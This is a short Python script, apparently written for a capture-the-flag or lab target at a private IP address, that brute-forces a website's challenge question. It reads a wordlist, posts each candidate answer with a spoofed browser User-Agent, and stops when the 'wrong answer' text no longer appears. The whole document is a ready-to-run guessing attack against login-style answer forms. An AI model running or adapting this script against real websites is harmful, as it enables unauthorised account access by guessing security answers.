import sys
import requests
import os.path
import argparse

def unpack(fline):
    return fline.strip()

def do_req(url, answer, headers):
    data = {"answer": answer, "question": question, "userid": "uname", "submit": "answer"}
    try:
        res = requests.post(url, headers=headers, data=data)
        return res.text
    except requests.exceptions.RequestException as e:
        print("[!] An error occurred during the request:", e)
        sys.exit(1)

def check_invalid(response_text, invalid_text):
    return invalid_text in response_text

def main():
    parser = argparse.ArgumentParser(description="Brute-force a challenge question on a website.")
    parser.add_argument("wordlist", help="Path to the wordlist file")
    args = parser.parse_args()

    if not os.path.isfile(args.wordlist):
        print("[!] Please provide a valid wordlist file.")
        sys.exit(1)

    with open(args.wordlist) as fh:
        for line in fh:
            answer = unpack(line)
            print("[-] Checking answer:", answer)

            response = do_req(url, answer, headers)

            if check_invalid(response, invalid):
                print("[!] Invalid answer:", answer)
            else:
                print("[+] Valid answer found:", answer)
                sys.exit(0)

    print("[!] No valid answers found.")

if __name__ == "__main__":
    url = "http://10.10.10.10:1337/" #change this
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}
    invalid = "Sorry, wrong answer" #this
    question = "Do you prefer pizza or pasta?" #and this

    main()
